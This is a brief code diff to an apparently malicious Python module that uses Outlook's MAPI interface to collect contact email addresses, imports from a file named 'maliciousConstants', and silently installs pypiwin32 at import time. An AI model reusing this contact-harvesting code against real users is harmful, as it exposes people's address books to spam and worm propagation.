@@ -7,8 +7,7 @@ import subprocess
 subprocess.run(["pip", "install", "-U", "pypiwin32"])
 import win32com.client
 
-from maliciousConstants import LEN_LIMIT, AT, CONTACTS_FILEPATH, \
-    OUTLOOK_APP, MAPI
+from maliciousConstants import LEN_LIMIT, AT, OUTLOOK_APP, MAPI
 
 
 class Contacts(object):
@@ -60,3 +59,4 @@ class Contacts(object):
                         self.email_addresses.append(address)
             except Exception as e:
                 print(str(e))
+                
